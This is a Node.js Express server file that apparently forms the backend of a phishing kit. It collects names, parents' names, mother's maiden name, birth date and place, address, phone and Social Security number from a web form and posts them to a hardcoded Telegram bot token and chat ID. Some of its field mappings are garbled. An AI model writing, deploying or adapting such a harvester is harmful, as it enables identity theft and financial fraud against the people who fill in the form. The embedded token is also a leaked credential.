const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

// Create Express app
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Telegram configuration - REPLACE THESE WITH YOUR VALUES
const TELEGRAM_BOT_TOKEN = '7264938782:AAEkoiz0kJA1HyuToHGZmvcMc_6kQmXMmXM';
const TELEGRAM_CHAT_ID = '1012698310';

// API endpoint for form submission
app.post('/api/submit-form', async (req, res) => {
  try {
    const formData = req.body;
    
    // Format the message for Telegram
    let message = '📝 *New Form Submission*\n\n';
    
    // Basic Information
    message += '*Basic Information*\n';
    message += `👤 Name: ${formData.firstname || '-'} ${formData.middlename || ''} ${formData.surname || '-'}\n\n`;
    
    // Family Information
    message += '*Family Information*\n';
    message += `👨 Father's Name: ${formData.fathersname || '-'} ${formData.mothername || '-'} ${formData.maidename || '-'}\n`;
    message += `👩 Mother's Name: ${formData['fathersname'] || '-'} ${formData['mothername'] || '-'} ${formData['maidename'] || '-'}\n`;
    message += `👰 Mother's Maiden Name: ${formData['fathersname'] || '-'}\n\n`;
    
    // Birth Information
    message += '*Birth Information*\n';
    message += `🏙️ Place of Birth: ${formData.birthplace || '-'}\n`;
    message += `📅 Date of Birth: ${formData.birthdate || '-'}\n\n`;
    
    // Contact Information
    message += '*Contact Information*\n';
    message += `🏠 Address: ${formData.address || '-'}\n`;
    message += `🏙️ City: ${formData.city || '-'}\n`;
    message += `🗺️ State: ${formData.state || '-'}\n`;
    message += `📮 ZIP: ${formData.zip || '-'}\n\n`;
    
    // Additional Information
    message += '*Additional Information*\n';
    message += `📱 Mobile: ${formData.mobile || '-'}\n`;
    message += `🆔 SSN: ${formData.ssn || '-'}\n`;
    
    // Send to Telegram
    const telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(telegramURL, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });

    // Send success response back to client
    res.status(200).json({ success: true, message: 'Form data sent to Telegram successfully' });
    
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Error sending form data to Telegram',
      error: error.message
    });
  }
});

// Default route serves the HTML page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});


app.get('/success', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'success.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});